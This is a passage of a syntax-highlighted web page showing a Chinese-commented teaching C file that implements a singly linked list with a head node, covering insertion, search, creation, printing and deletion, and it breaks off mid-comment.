class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    适用于标准C</span></span><br><span class="line"><span class="comment">    LinkList.c</span></span><br><span class="line"><span class="comment">    无序单链表的实现代码</span></span><br><span class="line"><span class="comment">    V1.1――2016.9.20 by wangx</span></span><br><span class="line"><span class="comment">    v1.2――2017.9.7  by wangx</span></span><br><span class="line"><span class="comment">    v1.2.1――2017.9.10  by wangx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; //for memcpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OVERFLOW 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//公共错误码，项目组成员之间的共同约定</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ERROR  -1  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTFIND  -2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARAM_ERROR -3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REALLOC_ERROR  -4  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_ID  0  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  <span class="title">person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> ID;           <span class="comment">//4</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];     <span class="comment">//20</span></span><br><span class="line">&#125;Elemtype;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单链表的单个数据结点的类型定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elemtype    data;  <span class="comment">//24</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">next</span>;</span> <span class="comment">//4 </span></span><br><span class="line">&#125;NODE, *pNODE;                 <span class="comment">//如果定义数据结点的对象或变量，每个变量有24+4=28个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//单链表整体结构的类型定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LIST</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Count;                 <span class="comment">//数据个数，即表长。该信息使用频繁，3种思路可做：1. 定义为pubblic权限的成员变量Count，增删清空等时候维护该变量，获取时直接以list1.Count的形式返回――有安全风险，且容易引发混乱，不提倡！</span></span><br><span class="line">                               <span class="comment">//                                               2. 定义成成员方法getCount()的形式，调用方法，临时去计算并返回长度值。                           ――计算费时，不适合频繁使用，尤其是数据量很大的时候</span></span><br><span class="line">                               <span class="comment">//                                               3. 定义为private权限的成员变量Count，增删清空等时候维护该变量，获取时用public权限的成员方法getCount()去读取该变量。――这是实际普遍使用的方式</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pHeadOfData</span>;</span>  <span class="comment">//指向单链表表头的指针，即书上所说的head指针。必须是private权限的，不允许其他类的对象来修改这个成员的值，对使用链表的程序员透明（即：不需要知道它的存在）。指向表头结点，一旦创建了链表对象，在销毁之前永不变。</span></span><br><span class="line">    <span class="comment">//下面是不太重要或常用的一些成员，同学们可以自由发挥想一下，例如如下：</span></span><br><span class="line">    <span class="keyword">int</span> maxValue;              <span class="comment">//一个并不成熟的设计，要求数据必须是可相互比较的类型，且删除后不好维护</span></span><br><span class="line">    <span class="keyword">int</span> minValue;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pTailOfData</span>;</span>   <span class="comment">//以方便快速定位到表尾结点（在数据的尾插法中可以用到）</span></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;LIST, *LINKLIST;              <span class="comment">//如果定义对象，则每个对象有4+4+4+4=16个字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：SearchByPos</span></span><br><span class="line"><span class="comment"> *  函数功能：查询指定的单链表中指定位置的元素，获得其数据结点的地址</span></span><br><span class="line"><span class="comment"> *  函数参数：pList ――指向某单链表对象的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *            pos   ――所搜数据在表中的逻辑位置（编号从0开始）</span></span><br><span class="line"><span class="comment"> *            ppNode――向主调函数传出（加一级指针）该表的第pos个结点的地址（一级指针），故此处需要用1+1=2级指针的参数类型</span></span><br><span class="line"><span class="comment"> *                      如果没找到第pos个元素，则该参数返回NULL，即0x00000000</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束； -2（NOTFIND）表示没找到； -3（PARAM_ERROR）表示参数校验失败</span></span><br><span class="line"><span class="comment"> *  备    注：同学们可以自己写SearchByValue函数</span></span><br><span class="line"><span class="comment"> *            该函数如果在类中，可设为public权限，开放</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//根据逻辑顺序值pos，在单链表pList中，将第pos个元素结点的地址值以参数形式传出。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SearchByPos</span><span class="params">(LIST *pList, <span class="keyword">int</span> pos, NODE **ppNode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    NODE *p;</span><br><span class="line">    <span class="comment">//参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i= <span class="number">0</span>;</span><br><span class="line">    p= pList-&gt;pHeadOfData;</span><br><span class="line">    <span class="keyword">while</span> ( i&lt;pos &amp;&amp; p-&gt;next!= <span class="literal">NULL</span>) <span class="comment">//当没有数到逻辑顺序的第i个结点 并且 还没有到表尾的时候，则</span></span><br><span class="line">    &#123;</span><br><span class="line">        p= p-&gt;next;          <span class="comment">//一边将p指针指向下一个结点</span></span><br><span class="line">        i++;                 <span class="comment">//一边计数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( i==pos ) <span class="comment">// 如果 i== pos，即p指向第pos个元素了</span></span><br><span class="line">    &#123;</span><br><span class="line">        *ppNode= p;    <span class="comment">//如果是以“找到第pos个元素”的姿态跳出while循环</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">//如果是p-&gt;next== NULL，即以“到表尾”的姿态跳出while循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        *ppNode= <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> NOTFIND;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：Insert</span></span><br><span class="line"><span class="comment"> *  函数功能：插入一个元素到指定的单链表中的指定位置后</span></span><br><span class="line"><span class="comment"> *  函数参数：pList――指向某单链表对象的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *            value――需要添加或插入的元素的值，假定元素值是有效的; 可稍作改动，支持结构体变量类型</span></span><br><span class="line"><span class="comment"> *            pos  ――需要插入的逻辑位置（之后），pos大于表长时视为“表尾追加元素”，pos&lt;=0时视为“表头后插入元素”</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：本函数不对上层程序员开放。在无序表中，不需要指定插入的位置（因为无序表中元素的先后顺序并不重要。在Java或C++的有些类中，也提供了这种插入操作，主要是在指定位置之前插入。同学们可以自行设计和尝试改写下面代码）</span></span><br><span class="line"><span class="comment"> *                                      在有序表中，其该插入的位置是由其值的大小来决定的，无须指定插入位置pos；而且，有序表，主要都用在顺序表中，很少有用在单链表里的情况。查找很不方便哦！折半查找没法用！（作为练手，同学们可以尝试编写这个插入方法）</span></span><br><span class="line"><span class="comment"> *            该函数如果在类中，可设为private权限，不开放</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Insert</span><span class="params">(LIST *pList, Elemtype value, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> len;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pNew</span>= <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pPre</span>= <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="comment">//参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//参数调整</span></span><br><span class="line">    len= pList-&gt;Count; <span class="comment">//将长度信息读出来备用，len变量不定义也是可以的。</span></span><br><span class="line">    <span class="keyword">if</span> (pos &gt;= len)</span><br><span class="line">        pos= len;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt;<span class="number">0</span>)</span><br><span class="line">        pos= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入第一步：申请新结点空间</span></span><br><span class="line">    pNew= (struct NODE *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct NODE));</span><br><span class="line">    <span class="keyword">if</span> (pNew==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入第二步：填值到新结点空间，准备就绪</span></span><br><span class="line">    <span class="built_in">memset</span>(pNew, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct NODE));</span><br><span class="line">    pNew-&gt;data.ID= value.ID; <span class="comment">//此处不能直接写成pNew-&gt;data= value;</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pNew-&gt;data.name, value.name, <span class="built_in">strlen</span>(value.name));</span><br><span class="line">    pNew-&gt;next= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入第三步：找到第pos个结点，以备在其后插入新结点</span></span><br><span class="line">    ret= SearchByPos(pList, pos, &amp;pPre);</span><br><span class="line">    <span class="keyword">if</span> (ret== NOTFIND)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(pNew);</span><br><span class="line">        <span class="keyword">return</span> NOTFIND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入第四步：插入结点</span></span><br><span class="line">    pNew-&gt;next= pPre-&gt;next;</span><br><span class="line">    pPre-&gt;next= pNew;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//插入第五步：长度值别忘了+1</span></span><br><span class="line">    pList-&gt;Count++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：AddToTail</span></span><br><span class="line"><span class="comment"> *  函数功能：往“无序”的线性“表尾”后面添加一个元素（即：在表尾追加一个元素结点）</span></span><br><span class="line"><span class="comment"> *  函数参数：pList――指向某单链表对象的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *            value――需要添加的元素的值，假定元素值是有效的; 可稍作改动，支持结构体变量类型</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：该函数如果在类中，可设为public权限，开放给上层程序员使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AddToTail</span><span class="params">(LIST *pList, Elemtype value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    len= pList-&gt;Count;</span><br><span class="line">    <span class="keyword">return</span> Insert(pList, value, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：AddToHead</span></span><br><span class="line"><span class="comment"> *  函数功能：往“无序”的线性“表头”后面添加一个元素结点</span></span><br><span class="line"><span class="comment"> *  函数参数：pList――指向某单链表对象的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *            value――需要添加的元素的值，假定元素值是有效的; 可稍作改动，支持结构体变量类型</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：该函数如果在类中，可设为public权限，开放给上层程序员使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AddToHead</span><span class="params">(LIST *pList, Elemtype value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Insert(pList, value, <span class="number">0</span>); <span class="comment">//在第一个元素之前（即：第0个元素之后）插入元素结点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *   函数名字：createList</span></span><br><span class="line"><span class="comment"> *  函数功能：创建一个空的带表头节点的单向链表</span></span><br><span class="line"><span class="comment"> *  函数参数：ppList――是一个2级指针，调用结束后*ppList指向一个单链表结构的对象</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：该函数如果在类中，可设为public权限，开放给上层程序员使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//创建一个带表头结点的链表，完成数据输入和串接</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createList</span><span class="params">(LIST **ppList)</span>  <span class="comment">//一般我们都将指向单链表第一个结点（或表头结点）的指针命名为head，这是习惯约定</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LIST</span> *<span class="title">pNewList</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pNewNode</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (ppList==<span class="literal">NULL</span>)              <span class="comment">//参数校验，注意：此处校验的是ppList（不能为空，口袋必须要有！），不是*ppList（可以为NULL，表示有口袋，但是口袋里什么东西都没有）。</span></span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个表头结点，并用pNewList指向该空间</span></span><br><span class="line">    pNewNode = (struct NODE *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct NODE));  <span class="comment">//申请空间，注意：申请的是一个表结点的空间(28个字节)</span></span><br><span class="line">    <span class="keyword">if</span> (pNewNode==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pNewNode, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct NODE));</span><br><span class="line">    pNewNode-&gt;next = <span class="literal">NULL</span>;  <span class="comment">//空表，没有后续结点。表头结点的data域不需要处理，清0即可。另，养成良好习惯，当结点的next成员指向何方尚不明朗时，先置为NULL以防患于未然，避免野指针。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个表对象的空间，并用pNewList指向该空间</span></span><br><span class="line">    pNewList = (struct LIST *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct LIST));  <span class="comment">//申请空间，注意：申请的是一个表对象的空间(16个字节)，而不是一个表结点的空间(28个字节)</span></span><br><span class="line">    <span class="keyword">if</span> (pNewList==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(pNewNode);     <span class="comment">//在发生异常，准备退出之前，先把之前成功申请的pNewNode结点空间给释放了！这一点很多程序员容易忽略，造成内存泄露！</span></span><br><span class="line">        <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pNewList, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct LIST));</span><br><span class="line">    pNewList-&gt;Count= <span class="number">0</span>;   <span class="comment">//设置该空表头的表长值为0</span></span><br><span class="line">    pNewList-&gt;pHeadOfData = pNewNode;  <span class="comment">//表对象的数据头指针指向刚才建好的表头结点。</span></span><br><span class="line">    pNewList-&gt;pTailOfData = pNewNode;  <span class="comment">//表对象的数据尾指针指向刚才建好的表头结点。空表，没数据，所以尾指针指向头结点。</span></span><br><span class="line"></span><br><span class="line">    *ppList = pNewList;  <span class="comment">//给表头指针赋值为表头结点的地址。</span></span><br><span class="line">                         <span class="comment">//这是套路，先用一个临时变量pNewList去操作数据，然后交付给*ppList</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;            <span class="comment">//本函数是如何返回表头指针的？又如何调用本函数呢？思考这2个问题！能画出内存四区图来么？</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *   函数名字：createList2</span></span><br><span class="line"><span class="comment"> *  函数功能：创建一个单向链表，并填入数据，以尾插法实现结点挂接。</span></span><br><span class="line"><span class="comment"> *  函数参数：</span></span><br><span class="line"><span class="comment"> *  函数返回：LIST ** （函数运行结束之后，返回指向该表对象空间的一个2级指针）</span></span><br><span class="line"><span class="comment"> *  备    注：以前数据结构的老版本，没学过面向对象思想的人才会这么写</span></span><br><span class="line"><span class="comment">              这个方法不是面向对象的思想！不会成为单链表类的一个成员函数。写在这里，只是为了给同学们展示目前大多数教科书或考题中的一个不成熟的考法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//创建一个带表头结点的链表，并且完成数据输入和串接</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createList2</span><span class="params">(LIST **ppList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pNew</span>;</span></span><br><span class="line">    Elemtype Data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ppList==<span class="literal">NULL</span>)              <span class="comment">//参数校验</span></span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line"></span><br><span class="line">    createList(ppList);          <span class="comment">//调用之前定义的函数，产生一个空表</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入学生的5位证件号的值和姓名（空格隔开，ID值为0表示输入结束）："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;(Data.ID));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, Data.name);</span><br><span class="line">    <span class="comment">//创建并挂接后续的各个结点</span></span><br><span class="line">    <span class="keyword">while</span> (Data.ID != END_ID)  <span class="comment">//程序员和用户已约定：当用户输入的数据为0（END_ID）时，表示数据录入的结束（注意，此约定不是唯一方法，仅供学习时适用）</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建新的结点并赋值</span></span><br><span class="line">        pNew = (struct NODE *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct NODE));  <span class="comment">//申请空间</span></span><br><span class="line">        <span class="keyword">if</span> (pNew==<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(pNew, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct NODE));</span><br><span class="line"></span><br><span class="line">        pNew-&gt;data.ID= Data.ID;    <span class="comment">//为新结点的data域填入数据</span></span><br><span class="line">        <span class="built_in">memcpy</span>(pNew-&gt;data.name, Data.name, <span class="built_in">strlen</span>(Data.name));</span><br><span class="line">        pNew-&gt;next = <span class="literal">NULL</span>;           <span class="comment">//为新结点的next域填入数据，指向不行时填入NULL；或因为其是新的表尾结点，所以也应该将其next域填入NULL表示链表在结尾。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//将新结点挂接到原链表中，此步骤很关键！</span></span><br><span class="line">        (*ppList)-&gt;pTailOfData-&gt;next = pNew;          <span class="comment">//pTail专门指向链表当前的最后一个结点，此行代码实现了将新结点连入链表尾部（还记得王老师曾经讲过的指针赋值的那句口诀不？“指针的赋值如何看？等式左边的指针，指向等式右边指针所指向的东西”）</span></span><br><span class="line">        (*ppList)-&gt;pTailOfData = pNew;                <span class="comment">//pTail指向的结点已经不是链表的表尾结点了（挂接之后，pNew指向的结点才是新的表尾结点），故而刷新pTail，让其指向新的表尾结点。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入学生的5位证件号的值和姓名（空格隔开，ID值为0表示输入结束）："</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;(Data.ID));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, Data.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">//本函数是如何返回一个表的？思考这个问题！</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：output</span></span><br><span class="line"><span class="comment"> *  函数功能：输出单链表的所有结点数据，在屏幕上显示打印</span></span><br><span class="line"><span class="comment"> *  函数参数：pList――指向某单链表对象的一级指针，要求非空（有了它，我们就能顺藤摸瓜，找出所有数据）</span></span><br><span class="line"><span class="comment"> *  函数返回：无（这是一个打印或显示类型的函数，不需要返回任何数据）</span></span><br><span class="line"><span class="comment"> *  备    注：教学演示所用，并无实用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(struct LIST *pList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span>)                 <span class="comment">//参数如果不正确，则直接罢工</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    p = pList-&gt;pHeadOfData-&gt;next;   <span class="comment">//"顺藤"，从pHeadOfData-&gt;next开始，跳过表头节点的Data域不打印</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>)               <span class="comment">//到尾。注意，单链表的最后一个结点的next域的值为NULL，本块代码也是读取单链表的标准模板</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%6d  "</span>, p-&gt;data.ID);  <span class="comment">//"摸瓜"</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,  p-&gt;data.name);</span><br><span class="line">        p = p-&gt;next;                <span class="comment">//千万别忘记本行代码，否则死循环了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：DelByPos</span></span><br><span class="line"><span class="comment"> *  函数功能：删除指定单链表中指定逻辑顺序位置的元素结点，并将删除的元素的值提取出来</span></span><br><span class="line"><span class="comment"> *  函数参数：pList ――指向某单链表对象的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *            pos   ――需要删除的结点的逻辑序号（从0开始编号），pos大于表长或者pos&lt;=0时视为“参数不合法”</span></span><br><span class="line"><span class="comment"> *            pValue――指向被删除元素的值，以方便在有些应用场合中对其做死前最后可能的访问操作。</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：该函数如果在类中，可设为public权限，开放。同学们可以自行练习DelByValue函数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DelByPos</span><span class="params">(struct LIST *pList, <span class="keyword">int</span> pos, Elemtype *pValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pDel</span>= <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">pPre</span>= <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="comment">//参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除第一步：找到第pos-1个结点的地址，顺带着也就校验了pos值是否过大</span></span><br><span class="line">    ret= SearchByPos(pList, pos<span class="number">-1</span>, &amp;pPre); <span class="comment">//要删除第pos个元素，在链表这种结构中，需要获取到第pos-1个元素的地址，以方便删除操作</span></span><br><span class="line">    <span class="keyword">if</span> (ret== NOTFIND) <span class="comment">//如果本来该表压根就没有第pos-1个元素，那无法完成删除，pos值过大！</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除第二步：获取第pos个结点的地址并暂存该地址（函数的任务就是要删这个结点）</span></span><br><span class="line">    pDel= pPre-&gt;next; </span><br><span class="line">    <span class="keyword">if</span> (pDel==<span class="literal">NULL</span>)  <span class="comment">//有第pos-1个结点，但恰好没有第pos个结点的情况，仍然归咎于pos参数传入错误</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除第三步：将第pos个结点从链表中摘下来，使其脱离链表</span></span><br><span class="line">    pPre-&gt;next= pPre-&gt;next-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除第四步：（非必须的步骤）将该结点的值拷贝出来，以备上层函数可能使用</span></span><br><span class="line">    pValue-&gt;ID= pDel-&gt;data.ID;</span><br><span class="line">    <span class="built_in">memcpy</span>(pValue-&gt;name, pDel-&gt;data.name, <span class="built_in">strlen</span>(pDel-&gt;data.name));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除第五步：释放pDel指针所指向的结点空间（在堆区），注意，并不是释放pDel指针变量本身这4个字节哦！free之后，pDel变量仍然存在！成为了一个野指针！</span></span><br><span class="line">    <span class="built_in">free</span>(pDel);</span><br><span class="line">    pDel=<span class="literal">NULL</span>;  <span class="comment">//指针复位操作。可以看出，pDel指针仍然存在，有值，但其指向的空间已被回收。为了避免误操作，特意将这4个字节的空间全部清0，即让pDel指针为NULL</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//删除第六步：长度值别忘了-1</span></span><br><span class="line">    pList-&gt;Count--;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思考下面的这些操作应该怎么去设计参数和操作思想？</span></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：clearList</span></span><br><span class="line"><span class="comment"> *  函数功能：清空一个单向链表的数据</span></span><br><span class="line"><span class="comment"> *  函数参数：pList――是一个指向表对象空间的1级指针。</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    